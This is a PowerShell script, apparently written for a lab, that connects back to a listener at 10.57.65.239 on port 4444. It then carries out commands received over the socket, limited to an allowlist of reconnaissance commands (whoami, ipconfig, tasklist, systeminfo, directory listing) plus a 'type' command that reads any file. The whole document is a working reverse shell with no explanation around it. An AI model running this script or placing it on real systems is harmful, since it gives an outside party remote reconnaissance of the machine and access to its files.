$client = New-Object System.Net.Sockets.TcpClient("10.57.65.239",4444)
$stream = $client.GetStream()

$reader = New-Object System.IO.StreamReader($stream)
$writer = New-Object System.IO.StreamWriter($stream)
$writer.AutoFlush = $true

while ($true) {
    $writer.Write("LAB> ")
    $inputLine = $reader.ReadLine()

    if ($inputLine -eq "exit") {
        break
    }

    # Split the input into command + arguments
    $parts = $inputLine -split " ", 2
    $command = $parts[0].ToLower()
    $arguments = if ($parts.Count -gt 1) { $parts[1] } else { "" }

    switch ($command) {

        "whoami" {
            $output = whoami
        }

        "hostname" {
            $output = hostname
        }

        "ipconfig" {
            $output = ipconfig | Out-String
        }

        "dir" {
            if ($arguments) {
                $output = dir $arguments | Out-String
            } else {
                $output = dir | Out-String
            }
        }

        "ls" {
            if ($arguments) {
                $output = ls $arguments | Out-String
            } else {
                $output = ls | Out-String
            }
        }

        "pwd" {
            $output = (Get-Location).Path
        }

        "type" {          # View file content
            if ($arguments) {
                try {
                    $output = Get-Content $arguments | Out-String
                }
                catch {
                    $output = "Error reading file."
                }
            } else {
                $output = "Usage: type filename.txt"
            }
        }

        "tasklist" {
            $output = tasklist | Out-String
        }

        "systeminfo" {
            $output = systeminfo | Out-String
        }

        default {
            $output = "Command not allowed."
        }
    }

    $writer.WriteLine($output)
}

$reader.Close()
$writer.Close()
$client.Close()
